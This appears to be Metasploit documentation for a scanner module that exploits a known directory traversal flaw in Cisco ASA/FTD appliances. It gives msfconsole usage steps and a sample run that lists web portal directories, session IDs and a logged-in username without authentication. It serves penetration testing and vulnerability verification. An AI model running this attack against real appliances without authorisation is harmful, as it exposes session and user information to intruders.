## Description

  This module exploits a directory traversal vulnerability on Cisco products running the Adaptive Security Appliance (ASA) software < v9.6 and Firepower Threat Defense (FTD) software < v6.2.3.
  Sending a specially crafted HTTP request results in viewing the contents of directories that would otherwise require authentication to view.

## Vulnerable Application

  Cisco ASA software < v9.6 and Cisco FTD software < v6.2.3 running on  vulnerable appliances that can be found [here](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd)

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/http/cisco_directory_traversal```
  4. Do: ```set RHOSTS [IP]```
  5. Do: ```run```

## Scenarios

### Tested on Cisco ASA 5505 Series running ASA software v8.2

  ```

  msf5 > use auxiliary/scanner/http/cisco_directory_traversal
  msf5 auxiliary(scanner/http/cisco_directory_traversal) > set rhosts 192.168.1.1
  rhosts => 192.168.1.1
  msf5 auxiliary(scanner/http/cisco_directory_traversal) > run

  [+] ///
  [
  {'name':'customization','size':0,'type':'1','mdate':1532972199}
  ,{'name':'bookmarks','size':0,'type':'1','mdate':1532972199}
  ,{'name':'locale','size':0,'type':'1','mdate':1532972197}
  ,{'name':'+CSCOT+','size':0,'type':'1','mdate':1532971872}
  ,{'name':'+CSCOCA+','size':0,'type':'1','mdate':1532971872}
  ,{'name':'+CSCOL+','size':0,'type':'1','mdate':1532971871}
  ,{'name':'admin','size':0,'type':'1','mdate':1532971871}
  ,{'name':'+CSCOU+','size':0,'type':'1','mdate':1532971871}
  ,{'name':'+CSCOE+','size':0,'type':'1','mdate':1532971871}
  ,{'name':'sessions','size':0,'type':'1','mdate':1532971871}

  [+] ///sessions/
  [
  {'name':'32768','size':0,'type':'1','mdate':1533130976}

  [*] Users logged in:
  [+] cisco

  [+] //+CSCOE+
  [
  {'name':'logo.gif','size':0,'type':'0','mdate':1532972377}
  ,{'name':'http_auth.html','size':3317,'type':'0','mdate':1532972377}
  ,{'name':'user_dialog.html','size':2145,'type':'0','mdate':1532972377}
  ,{'name':'localization_inc.lua','size':4495,'type':'0','mdate':1532972377}
  ,{'name':'portal_inc.lua','size':30888,'type':'0','mdate':1532972377}
  ,{'name':'include','size':0,'type':'1','mdate':1532971872}
  ,{'name':'nostcaccess.html','size':497,'type':'0','mdate':1532972377}
  ,{'name':'ask.html','size':2520,'type':'0','mdate':1532972377}
  ,{'name':'no_svc.html','size':1779,'type':'0','mdate':1532972377}
  ,{'name':'svc.html','size':2701,'type':'0','mdate':1532972377}
  ,{'name':'session.js','size':371,'type':'0','mdate':1532972377}
  ,{'name':'useralert.html','size':2526,'type':'0','mdate':1532972377}
  ,{'name':'ping.html','size':4296,'type':'0','mdate':1532972377}
  ,{'name':'help','size':0,'type':'1','mdate':1532971872}
  ,{'name':'app_index.html','size':14531,'type':'0','mdate':1532972377}
  ,{'name':'tlbr','size':1960,'type':'0','mdate':1532972377}
  ,{'name':'portal_forms.js','size':265,'type':'0','mdate':1532972377}
  ,{'name':'logon_forms.js','size':263,'type':'0','mdate':1532972377}
  ,{'name':'win.js','size':247,'type':'0','mdate':1532972377}
  ,{'name':'portal.css','size':4757,'type':'0','mdate':1532972377}
  ,{'name':'portal.js','size':369,'type':'0','mdate':1532972377}
  ,{'name':'sess_update.html','size':267,'type':'0','mdate':1532972377}
  ,{'name':'blank.html','size':255,'type':'0','mdate':1532972377}
  ,{'name':'noportal.html','size':261,'type':'0','mdate':1532972377}
  ,{'name':'portal_ce.html','size':7990,'type':'0','mdate':1532972377}
  ,{'name':'portal.html','size':10999,'type':'0','mdate':1532972377}
  ,{'name':'home','size':0,'type':'1','mdate':1532971872}
  ,{'name':'logon_custom.css','size':499,'type':'0','mdate':1532972377}
  ,{'name':'portal_custom.css','size':315,'type':'0','mdate':1532972377}
  ,{'name':'preview.html','size':259,'type':'0','mdate':1532972377}
  ,{'name':'session_expired','size':0,'type':'0','mdate':1532972377}
  ,{'name':'custom','size':0,'type':'1','mdate':1532971872}
  ,{'name':'portal_elements.html','size':33659,'type':'0','mdate':1532972377}
  ,{'name':'commonspawn.js','size':379,'type':'0','mdate':1532972377}
  ,{'name':'common.js','size':369,'type':'0','mdate':1532972377}
  ,{'name':'appstart.js','size':1777,'type':'0','mdate':1532972377}
  ,{'name':'appstatus','size':1904,'type':'0','mdate':1532972377}
  ,{'name':'relaymonjar.html','size':0,'type':'0','mdate':1532972377}
  ,{'name':'relaymonocx.html','size':0,'type':'0','mdate':1532972377}
  ,{'name':'relayjar.html','size':0,'type':'0','mdate':1532972377}
  ,{'name':'relayocx.html','size':0,'type':'0','mdate':1532972377}
  ,{'name':'portal_img','size':0,'type':'1','mdate':1532971872}
  ,{'name':'color_picker.js','size':381,'type':'0','mdate':1532972377}
  ,{'name':'color_picker.html','size':269,'type':'0','mdate':1532972377}
  ,{'name':'cedhelp.html','size':2819,'type':'0','mdate':1532972377}
  ,{'name':'cedmain.html','size':5084,'type':'0','mdate':1532972377}
  ,{'name':'cedlogon.html','size':4147,'type':'0','mdate':1532972377}
  ,{'name':'cedportal.html','size':2762,'type':'0','mdate':1532972377}
  ,{'name':'cedsave.html','size':2167,'type':'0','mdate':1532972377}
  ,{'name':'cedf.html','size':51675,'type':'0','mdate':1532972377}
  ,{'name':'ced.html','size':51673,'type':'0','mdate':1532972377}
  ,{'name':'lced.html','size':2477,'type':'0','mdate':1532972377}
  ,{'name':'files','size':0,'type':'1','mdate':1532971871}
  ,{'name':'041235123432C2','size':1101,'type':'0','mdate':1532972377}
  ,{'name':'041235123432U2','size':464,'type':'0','mdate':1532972377}
  ,{'name':'pluginlib.js','size':375,'type':'0','mdate':1532972377}
  ,{'name':'shshim','size':1317,'type':'0','mdate':1532972377}
  ,{'name':'do_url','size':0,'type':'0','mdate':1532972377}
  ,{'name':'clear_cache','size':0,'type':'0','mdate':1532972377}
  ,{'name':'connection_failed_form','size':0,'type':'0','mdate':1532972377}
  ,{'name':'apcf','size':0,'type':'0','mdate':1532972377}
  ,{'name':'ucte_forbidden_data','size':0,'type':'0','mdate':1532972377}
  ,{'name':'ucte_forbidden_url','size':0,'type':'0','mdate':1532972377}
  ,{'name':'cookie','size':0,'type':'0','mdate':1532972377}
  ,{'name':'session_password.html','size':648,'type':'0','mdate':1532972377}
  ,{'name':'tunnel_linux.jnlp','size':1663,'type':'0','mdate':1532972377}
  ,{'name':'tunnel_mac.jnlp','size':1659,'type':'0','mdate':1532972377}
  ,{'name':'sdesktop','size':0,'type':'1','mdate':1532971871}
  ,{'name':'gp-gip.html','size':3097,'type':'0','mdate':1532972377}
  ,{'name':'auth.html','size':467,'type':'0','mdate':1532972377}
  ,{'name':'wrong_url.html','size':354,'type':'0','mdate':1532972377}
  ,{'name':'logon_redirect.html','size':1395,'type':'0','mdate':1532972377}
  ,{'name':'logout.html','size':31552,'type':'0','mdate':1532972377}
  ,{'name':'logon.html','size':31517,'type':'0','mdate':1532972377}
  ,{'name':'test_chargen','size':0,'type':'0','mdate':1532972377}

  [*] Auxiliary module execution completed

  ```
